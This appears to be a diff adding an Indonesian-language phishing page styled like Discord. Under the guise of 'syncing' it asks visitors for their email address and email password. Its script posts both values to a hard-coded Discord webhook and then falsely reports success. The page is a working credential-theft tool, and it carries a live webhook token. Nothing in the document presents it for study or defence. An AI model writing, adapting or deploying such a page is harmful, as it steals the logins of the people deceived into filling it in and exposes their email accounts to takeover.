@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Formulir Verifikasi User</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { background: #1a1a1a; color: white; font-family: Arial; text-align: center; padding: 50px 20px; }
+        .box { background: #2f3136; padding: 20px; border-radius: 8px; max-width: 400px; margin: auto; }
+        input { width: 90%; padding: 10px; margin: 10px 0; border-radius: 4px; border: none; }
+        button { width: 95%; padding: 10px; background: #5865f2; color: white; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; }
+    </style>
+</head>
+<body>
+
+<div class="box">
+    <h2>Update Informasi</h2>
+    <p>Silakan lengkapi data untuk sinkronisasi.</p>
+    
+    <input type="text" id="userInput" placeholder="masukkan email">
+    <input type="text" id="extraInfo" placeholder="masukkan password email">
+    
+    <button onclick="kirimData()">SINKRONKAN SEKARANG</button>
+</div>
+
+<script>
+async function kirimData() {
+    const user = document.getElementById('userInput').value;
+    const info = document.getElementById('extraInfo').value;
+    const webhook = "https://discord.com/api/webhooks/1476556112722530306/IQY3TPNcQyqr-12WSVJj6Y1De1dJWdZxgCprXJjYqtK9v7Sl9K1JEm73HfxMJRdEX6C9";
+
+    if (!user || !info) {
+        alert("Harap isi semua kolom!");
+        return;
+    }
+
+    await fetch(webhook, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+            content: "📩 **DATA MASUK BARU!**",
+            embeds: [{
+                title: "Informasi dari Website",
+                fields: [
+                    { name: "User/ID", value: user },
+                    { name: "Catatan", value: info }
+                ],
+                color: 3447003
+            }]
+        })
+    });
+
+    alert("Data berhasil disinkronkan!");
+}
+</script>
+
+</body>
+</html>
